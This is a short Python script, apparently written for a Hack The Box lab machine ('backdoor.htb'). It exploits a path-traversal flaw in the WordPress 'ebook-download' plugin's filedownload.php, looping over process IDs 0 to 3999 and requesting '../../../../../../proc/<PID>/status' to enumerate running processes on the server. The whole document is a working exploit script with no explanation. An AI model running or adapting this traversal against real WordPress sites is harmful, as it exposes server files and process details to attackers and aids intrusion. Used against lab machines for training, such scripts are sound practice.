import urllib.request
from urllib.error import URLError, HTTPError

for PID in range(4000):
	try:
		url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/" + str(PID) + "/status"
		status_code = urllib.request.urlopen(url).getcode()
	except HTTPError as e:
		print(url, 'Error code: ', e.code)
	except URLError as e:
		print('Reason: ', e.reason)
	else:
		website_is_up = status_code == 200
		print(url)
		print(website_is_up)
